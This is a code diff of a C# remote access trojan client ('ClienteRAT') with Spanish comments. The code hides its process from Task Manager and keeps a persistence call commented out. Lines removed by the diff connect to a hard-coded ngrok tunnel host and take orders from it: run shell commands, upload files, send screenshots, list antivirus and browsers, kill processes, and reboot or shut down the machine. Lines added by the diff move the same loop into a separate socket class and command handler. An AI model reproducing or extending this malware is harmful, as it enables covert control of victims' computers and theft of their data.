@@ -1,20 +1,17 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading.Tasks;
 using Client.Native;
 using Client.Commands;
 using Client.Util;
-using System.IO;
-
+using Client.Conexion;
 
 namespace Client
 {
     class ClienteRAT
     {
-        private static TcpClient client;
-        private static NetworkStream stream;
-        private static bool connected = true;
-
         static async Task Main(string[] args)
         {
             try
@@ -28,97 +25,33 @@ namespace Client
 
                 // Ocultar el proceso del Administrador de Tareas y generar persistencia
                 Functions.HideFromTaskManager();
-               // Functions.AddPersistence();
+                // Functions.AddPersistence();
 
                 // Iniciar la conexión con el servidor
-                client = new TcpClient("4.tcp.eu.ngrok.io", 11280);
-                stream = client.GetStream();
+                ClientSocket.connect();
 
                 // Bucle principal para recibir comandos y enviar respuestas
-                while (connected)
+                while (ClientSocket.isConnected())
                 {
                     try
                     {
                         byte[] buffer = new byte[1024];
-                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-
-                        string response;
-                        if (command.StartsWith("exec"))
+                        int bytesRead = ClientSocket.getClientStream().Read(buffer, 0, buffer.Length);
+                        if (bytesRead == 0)
                         {
-                            response = HandleCommands.ExecuteCommand(command.Substring(5));
-                        }
-                        else if (command == "list_processes")
-                        {
-                            response = Functions.ListProcesses();
-                        }
-                        else if (command.StartsWith("get "))
-                        {
-                            string fileName = command.Substring(4).Trim();
-                            response = "";
-                            SendFile(fileName);
-                        }
-                        else if (command == "browsers")
-                        {
-                            response = Functions.ListInstalledBrowsers();
-                        }
-                        else if (command == "reboot")
-                        {
-                            response = HandleCommands.ExecuteCommand("shutdown /r /t 10");
-                        }
-                        else if (command == "shutdown")
-                        {
-                            response = HandleCommands.ExecuteCommand("shutdown /s");
-                        }
-                        else if (command == "antivirus")
-                        {
-                            response = Functions.ListInstalledAntivirus();
-                        }
-                        else if (command == "network_info")
-                        {
-                            response = await SystemInfo.GetNetworkInfo();
-                        }
-                        else if (command == "system_info")
-                        {
-                            response = SystemInfo.GetSystemInfo();
-                        }
-                        else if (command=="screenshot")
-                        {
-                            string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
-                            string filename = $"infiltrator-{timestamp}-screenshot.png";
-                            Screenshot.CaptureScreen(filename);
-                            SendFile(filename);
-                            File.Delete(filename);
-                            response = "";
-                        }
-                        else if (command == "disconnect")
-                        {
-                            response = "";
-                            connected = false;
-                        }
-                        else if (command.StartsWith("kill "))
-                        {
-                            int pid;
-                            if (int.TryParse(command.Substring(5), out pid))
-                            {
-                                response = Functions.KillProcess(pid);
-                            }
-                            else
-                            {
-                                response = "Formato de comando 'kill' incorrecto. Uso: kill PID";
-                            }
-                        }
-                        else
-                        {
-                            response = "Comando no reconocido.";
+                            Console.WriteLine("Conexión cerrada por el servidor.");
+                            break;
                         }
 
-                        SendResponse(response);
+                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
+
+                        string response = await HandleCommands.ProcessCommandAsync(command);
+                        ClientSocket.SendResponse(response);
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine($"Error: {ex.Message}");
-                        connected = false;
+                        ClientSocket.setConnected(false);
                     }
                 }
             }
@@ -128,43 +61,9 @@ namespace Client
             }
             finally
             {
-                client.Close();
+                ClientSocket.disconnect();
             }
         }
-        
-
-        static void SendFile(string fileName)
-        {
-            try
-            {
-                byte[] fileNameBytes = Encoding.UTF8.GetBytes($"FILE: {fileName}\n");
-                stream.Write(fileNameBytes, 0, fileNameBytes.Length);
-
-                byte[] fileData = File.ReadAllBytes(fileName);
-                
-                stream.Write(fileData, 0, fileData.Length);
-
-                byte[] fileEndBytes = Encoding.UTF8.GetBytes("FILE_END\n");
-                
-                stream.Write(fileEndBytes, 0, fileEndBytes.Length);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error al enviar el archivo: {ex.Message}");
-            }
-        }
-
-   
-
-        static void SendResponse(string response)
-        {
-
-            byte[] data = Encoding.UTF8.GetBytes(response);
-            stream.Write(data, 0, data.Length);
-        }
-
-        
-
 
        
     }
